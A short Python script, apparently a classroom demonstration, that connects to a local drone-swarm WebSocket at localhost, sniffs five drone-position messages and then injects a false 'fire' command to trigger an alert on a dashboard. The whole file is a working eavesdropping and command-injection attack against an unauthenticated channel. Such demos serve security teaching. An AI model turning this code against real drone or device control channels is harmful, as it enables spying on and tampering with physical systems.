import asyncio
import websockets
import json
import time

async def hacker_mission():
    uri = "ws://localhost:8765"
    print(f"--- 🕵️ EAVESDROPPING ATTACK STARTED ---")
    print(f"Attempting to intercept data from {uri}...")
    
    try:
        async with websockets.connect(uri) as websocket:
            print(f"--- 📡 DATA INTERCEPTED! ---")
            
            # PHASE 1: Eavesdropping (Sniff 5 packets)
            for i in range(5):
                message = await websocket.recv()
                data = json.loads(message)
                print(f"[SNIFFED] {time.strftime('%H:%M:%S')} - Drone 1 Position: ({data[0]['x']:.2f}, {data[0]['y']:.2f})")
                await asyncio.sleep(0.5)
            
            print(f"\n--- ⚡ TRANSITION TO ACTIVE ATTACK ---")
            print(f"Injecting malicious 'FIRE ALERT' command to manipulate swarm behavior...")
            
            # PHASE 2: Active Manipulation (Injected command)
            malicious_command = { "command": "fire" }
            await websocket.send(json.dumps(malicious_command))
            
            print(f"--- ✅ INJECTION SUCCESSFUL! ---")
            print(f"Watch the dashboard for the 🔥 fire alert!")
            
            # Wait a bit to show it worked
            await asyncio.sleep(5)
            
    except Exception as e:
        print(f"--- ❌ ATTACK FAILED: {e} ---")
        print("Is the backend server running?")

if __name__ == "__main__":
    asyncio.run(hacker_mission())
